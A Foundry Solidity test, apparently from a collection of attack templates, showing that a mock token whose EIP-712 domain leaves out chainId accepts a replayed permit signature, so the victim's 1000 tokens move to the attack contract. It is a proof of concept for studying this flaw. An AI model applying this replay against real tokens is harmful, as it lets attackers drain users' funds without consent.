// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "../src/mocks/MockPermitToken.sol";
import "../src/attacks/permit_replay.sol";

/**
 * @title PermitReplayTest
 * @notice Proves the `permit_replay` template: the token's EIP-712 domain
 *         omits chainId, so a signature captured on one chain is replayed on
 *         another. (Here we simply show the no-chainId digest is accepted.)
 */
contract PermitReplayTest is Test {
    MockPermitToken public token;
    PermitReplay public replay;
    uint256 internal constant VICTIM_KEY = 0xA11CE;
    address public victim;

    function setUp() public {
        victim = vm.addr(VICTIM_KEY);
        token = new MockPermitToken();
        replay = new PermitReplay();
        token.mint(victim, 1000 ether);
    }

    function testPermitReplay() public {
        uint256 deadline = block.timestamp + 1 days;

        // victim signs permit(owner=victim, spender=replay, value=1000, nonce=0)
        bytes32 structHash = keccak256(
            abi.encode(token.PERMIT_TYPEHASH(), victim, address(replay), 1000 ether, 0, deadline)
        );
        bytes32 digest = keccak256(abi.encodePacked("\x19\x01", token.domainSeparator(), structHash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(VICTIM_KEY, digest);

        // the same signature would be valid on ANY chain (no chainId in domain)
        replay.replay(IERC20Permit(address(token)), victim, 1000 ether, deadline, v, r, s);

        assertEq(token.balanceOf(address(replay)), 1000 ether, "replayed signature spent victim funds");
    }
}
